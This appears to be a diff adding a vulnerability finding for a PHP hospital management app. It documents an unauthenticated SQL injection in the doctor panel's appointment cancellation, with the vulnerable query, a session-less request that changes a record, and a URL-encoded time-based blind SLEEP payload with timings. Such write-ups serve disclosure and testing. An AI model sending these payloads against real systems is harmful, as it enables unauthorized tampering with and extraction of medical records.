@@ -1,0 +1,15 @@
+HMS-03: Unauthenticated UPDATE SQL injection in doctor-panel appointment cancellation
+Sink: doctor-panel.php:8  mysqli_query($con,"update appointmenttb set doctorStatus='0' where ID = '".$_GET['ID']."'")
+Auth gate: NONE
+
+[1] Unauthorized status change (no session, plain ID)
+    GET /doctor-panel.php?cancel=1&ID=2          (no Cookie header)
+    HTTP 200
+    DB: SELECT ID,doctorStatus FROM appointmenttb WHERE ID=2
+      before: 2 | 1
+      after:  2 | 0
+
+[2] Time-based blind SQLi
+    baseline: GET /doctor-panel.php?cancel=1&ID=999   -> HTTP 200 in 0.078s
+    payload:  GET /doctor-panel.php?cancel=1&ID=999%27%20OR%20%28SELECT%20858%29%3E%28SELECT%20SLEEP%281%29%29--%20-
+              -> HTTP 200 in 12.173s   (12 rows x SLEEP(1))
